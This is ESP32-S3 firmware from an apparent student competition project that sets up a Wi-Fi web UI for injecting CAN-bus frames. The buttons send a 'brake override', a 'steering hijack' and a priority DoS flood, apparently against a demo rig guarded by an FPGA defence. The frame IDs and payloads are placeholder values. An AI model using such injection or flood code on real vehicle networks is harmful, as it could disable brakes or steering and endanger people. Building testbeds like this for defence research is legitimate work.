/*
 * ============================================================================
 *   AEGIS-CPS: AUTOMOTIVE CAN-BUS CYBER ATTACK INJECTOR
 *   Nirmaan 2026 - ESP32-S3 Attacker Node (WITH WEB UI)
 * ============================================================================
 */

#include <WiFi.h>
#include <WebServer.h>
#include <SPI.h>
#include <mcp2515.h>

// ESP32-S3 Specific SPI Pins
#define SCK_PIN 12
#define MISO_PIN 13
#define MOSI_PIN 11
#define CS_PIN 10

MCP2515 mcp2515(CS_PIN);
WebServer server(80);

// Wi-Fi Credentials
const char* ssid = "Aegis-Attacker-Net";

// State Flags
bool telemetryActive = true;
unsigned long lastTelemetryTime = 0;
uint16_t simulatedRPM = 800;
uint8_t simulatedSpeed = 0;

// Frame Definitions
struct can_frame frameRPM;   
struct can_frame frameSpeed; 
struct can_frame frameBrake; 
struct can_frame frameFlood; 
struct can_frame frameHijack;

// ============================================================================
//   THE "HACKER SUITE" WEB UI (HTML/CSS/JS)
// ============================================================================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kali-V Payload Injector</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
        
        body {
            background-color: #0a0a0a;
            color: #ff003c;
            font-family: 'Fira Code', monospace;
            margin: 0;
            padding: 20px;
        }
        
        h1 {
            text-align: center;
            border-bottom: 2px solid #ff003c;
            padding-bottom: 10px;
            text-shadow: 0 0 10px #ff003c;
        }
        
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .panel {
            border: 1px solid #ff003c;
            background: rgba(20, 0, 0, 0.8);
            padding: 20px;
            box-shadow: inset 0 0 15px rgba(255, 0, 60, 0.2);
        }

        .btn {
            display: block;
            width: 100%;
            background: transparent;
            color: #ff003c;
            border: 1px solid #ff003c;
            padding: 15px;
            margin-bottom: 15px;
            font-family: inherit;
            font-size: 1.1em;
            cursor: pointer;
            transition: 0.2s;
            text-transform: uppercase;
            font-weight: bold;
        }

        .btn:hover {
            background: #ff003c;
            color: #000;
            box-shadow: 0 0 15px #ff003c;
        }

        .btn:active { transform: scale(0.98); }

        /* Terminal */
        #terminal {
            background: #000;
            border: 1px solid #555;
            height: 400px;
            overflow-y: auto;
            padding: 15px;
            font-size: 0.9em;
            color: #0f0;
        }
        
        .log-entry { margin-bottom: 5px; }
        .log-time { color: #888; margin-right: 10px; }
        .log-err { color: #ff003c; }
        .log-warn { color: #ffaa00; }
    </style>
</head>
<body>

    <h1>☠️ VEHICLE EXPLOITATION FRAMEWORK ☠️</h1>
    
    <div class="grid">
        <!-- Controls Panel -->
        <div class="panel">
            <h2 style="margin-top:0;">► PAYLOAD DELIVERY</h2>
            
            <button class="btn" onclick="launchAttack('brake')">
                [ID: 0x100] Inject Brake Override
            </button>
            
            <button class="btn" onclick="launchAttack('flood')">
                [ID: 0x010] Priority DoS Flood
            </button>
            
            <button class="btn" onclick="launchAttack('hijack')">
                [ID: 0x001] Critical Steering Hijack
            </button>

            <h2 style="margin-top:30px;">► NETWORK STATE</h2>
            <button class="btn" style="color:#0f0; border-color:#0f0;" onclick="launchAttack('toggle')">
                Toggle Background Telemetry
            </button>
        </div>
        
        <!-- Terminal Panel -->
        <div class="panel">
            <h2 style="margin-top:0;">► ROOT@ATTACKER:~#</h2>
            <div id="terminal">
                <div class="log-entry"><span class="log-time">[SYS]</span> Exploitation Framework v2.0 Initialized.</div>
                <div class="log-entry"><span class="log-time">[SYS]</span> CAN configured for 500kbps; delivery and FPGA blocking unconfirmed.</div>
                <div class="log-entry" style="color:#888;"><span class="log-time">[*]</span> Injecting background benign telemetry (0x123, 0x200)...</div>
            </div>
        </div>
    </div>

    <script>
        function addLog(msg, type='normal') {
            let term = document.getElementById('terminal');
            let d = new Date();
            let timeStr = d.getHours().toString().padStart(2, '0') + ':' + 
                          d.getMinutes().toString().padStart(2, '0') + ':' + 
                          d.getSeconds().toString().padStart(2, '0');
            
            let classStr = 'log-entry';
            if(type === 'err') classStr += ' log-err';
            if(type === 'warn') classStr += ' log-warn';

            term.innerHTML += '<div class="' + classStr + '"><span class="log-time">[' + timeStr + ']</span> ' + msg + '</div>';
            term.scrollTop = term.scrollHeight;
        }

        async function launchAttack(type) {
            addLog("Preparing payload: " + type + "...", "warn");
            try {
                let res = await fetch('/api/attack?type=' + type);
                let text = await res.text();
                
                if (!res.ok) {
                    addLog("HTTP " + res.status + ": " + text, "err");
                } else if (text === "TOGGLED") {
                    addLog("Background telemetry stream toggled.");
                } else {
                    addLog(text);
                }
            } catch (e) {
                addLog("Connection error to injector.", "err");
            }
        }
    </script>
</body>
</html>
)rawliteral";

// ============================================================================
//   SERVER ROUTING & ATTACK LOGIC
// ============================================================================

void handleRoot() {
    server.send(200, "text/html", index_html);
}

void handleAttack() {
    String type = server.arg("type");
    String response = "";

    if (type == "toggle") {
        telemetryActive = !telemetryActive;
        response = "TOGGLED";
    } 
    else if (type == "brake" || type == "hijack" || type == "flood") {
        const can_frame* frame = type == "brake" ? &frameBrake :
                                 type == "hijack" ? &frameHijack : &frameFlood;
        unsigned int attempts = type == "flood" ? 20 : 1;
        unsigned int submitted = 0;
        int lastError = 0;
        for (unsigned int i = 0; i < attempts; ++i) {
            MCP2515::ERROR result = mcp2515.sendMessage(frame);
            if (result == MCP2515::ERROR_OK) ++submitted;
            else lastError = static_cast<int>(result);
            if (type == "flood") delay(2);
        }
        // ERROR_OK is a driver submission result, not an ECU receipt or FPGA report.
        response = "TX requests: " + String(attempts) +
                   "; driver accepted: " + String(submitted) +
                   "; driver errors: " + String(attempts - submitted) +
                   "; last error code: " + String(lastError) +
                   ". Delivery and FPGA blocking are UNCONFIRMED.";
    } else {
        server.send(400, "text/plain", "Unknown payload type");
        return;
    }

    server.send(200, "text/plain", response);
}

// ============================================================================
//   MAIN SETUP & LOOP
// ============================================================================

void setup() {
  Serial.begin(115200);
  SPI.begin(SCK_PIN, MISO_PIN, MOSI_PIN, CS_PIN);
  
  delay(1000);
  Serial.println(F("[*] Booting Hacker ESP32-S3 Web UI..."));

  // Start Wi-Fi Access Point on a DIFFERENT IP subnet (192.168.5.1)
  // This prevents conflicts if a judge uses the same phone for both dashboards
  IPAddress local_ip(192, 168, 5, 1);
  IPAddress gateway(192, 168, 5, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.softAPConfig(local_ip, gateway, subnet);
  WiFi.softAP(ssid);
  
  // Init CAN
  mcp2515.reset();
  mcp2515.setBitrate(CAN_500KBPS, MCP_8MHZ);
  mcp2515.setNormalMode();

  // Setup Payloads
  frameRPM.can_id = 0x123; frameRPM.can_dlc = 8;
  frameSpeed.can_id = 0x200; frameSpeed.can_dlc = 8;
  
  frameBrake.can_id = 0x100; frameBrake.can_dlc = 8;
  frameBrake.data[0] = 0xFF; frameBrake.data[1] = 0xA5; frameBrake.data[2] = 0x01;
  
  frameFlood.can_id = 0x010; frameFlood.can_dlc = 8;
  memset(frameFlood.data, 0x00, 8); 

  frameHijack.can_id = 0x001; frameHijack.can_dlc = 8;
  memset(frameHijack.data, 0xEE, 8);

  // Start Web Server
  server.on("/", handleRoot);
  server.on("/api/attack", handleAttack);
  server.begin();
  
  Serial.println(F("[+] Web Server Online at http://192.168.5.1"));
}

void loop() {
  server.handleClient(); // Listen for web clicks

  // Background normal traffic
  if (telemetryActive && (millis() - lastTelemetryTime > 1000)) {
    lastTelemetryTime = millis();
    simulatedRPM = (simulatedRPM > 5000) ? 800 : simulatedRPM + 150;
    simulatedSpeed = (simulatedSpeed > 120) ? 0 : simulatedSpeed + 2;

    frameRPM.data[0] = (simulatedRPM >> 8) & 0xFF; frameRPM.data[1] = simulatedRPM & 0xFF;
    frameSpeed.data[0] = simulatedSpeed;

    mcp2515.sendMessage(&frameRPM);
    delay(5);
    mcp2515.sendMessage(&frameSpeed);
  }
}
